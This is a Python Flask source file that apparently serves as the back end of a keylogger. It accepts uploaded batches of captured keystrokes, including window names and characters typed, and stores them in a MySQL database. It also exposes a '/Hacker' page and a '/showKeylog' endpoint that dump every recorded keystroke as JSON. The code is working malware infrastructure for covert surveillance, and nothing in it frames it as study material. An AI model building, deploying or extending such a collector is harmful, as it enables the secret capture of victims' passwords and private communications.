from flask import Flask, render_template, request, make_response, jsonify
import json
from json import JSONEncoder
import mysql.connector
import os
from datetime import datetime

#start flask app
app = Flask(__name__, template_folder='templates')

#load the configurations from json file
def load_cfg(path):
    jsonres = {}
    try:
        with open(os.path.abspath(os.path.realpath(path)), 'r') as f:
            jsonres = json.load(f)
    except Exception as e:
        print("Exception: ", e)
    return jsonres
    
def datetime_converter(o):
  if isinstance(o,datetime):
      return o.__str__()
    
@app.route('/')
def hello():
    return render_template('index.html')

@app.route('/pushKeys', methods=['POST'])
def addLog():
  data = json.loads(request.data)

  for key in range(len(data)):
  
    try:
      pushDB(json.loads(data[str(key)]))
      

    except Exception as e:
      print("Exception:",e)

      return make_response(jsonify({'response': 'Fail', 'code':500}), 500)
  
  return make_response(jsonify({'response': 'Success', 'code':200}), 200)


def pushDB(payload):
  main_cfg = load_cfg('./main_cfg.json')

  db = mysql.connector.connect (
    host=main_cfg['dbHost'],
    port=main_cfg['port'],
    user=main_cfg['sqlUser'],
    password=main_cfg['sqlPass'],
    database=main_cfg['db']
  )
  
  mycursor = db.cursor()
  
  sql = f"INSERT INTO {main_cfg['dbTable']} {main_cfg['dbRows']} VALUES (%s, %s, %s, %s, %s, %s,%s, %s, %s)"
  val = (f"{payload['datetime']}", f"{payload['epochTime']}", f"{payload['isKeyDown']}", f"{payload['windowName']}", f"{payload['asciiCode']}", f"{payload['asciiChar']}", f"{payload['keyName']}", f"{payload['isCaps']}", f"{payload['processedKey']}")
  print(sql,val)
  mycursor.execute(sql, val)
  
  db.commit()
  return 0 

@app.route('/Hacker', methods=['GET'])
def showKeylog():
  return render_template('base.html')

@app.route('/showKeylog', methods=['GET'])
def pushKeylog():
  main_cfg = load_cfg('./main_cfg.json')
  res = {}

  db = mysql.connector.connect (
    host=main_cfg['dbHost'],
    port=main_cfg['port'],
    user=main_cfg['sqlUser'],
    password=main_cfg['sqlPass'],
    database=main_cfg['db']
  )
  
  mycursor = db.cursor()
  
  sql = f"SELECT * FROM {main_cfg['dbTable']}"
  mycursor.execute(sql)
  
  res = json.dumps(mycursor.fetchall(), default=datetime_converter)
  print(res)

  return res
  
  

if __name__ == "__main__":
    # app.run(host="0.0.0.0", port=int("443"), debug=True)
    app.run(debug=True)
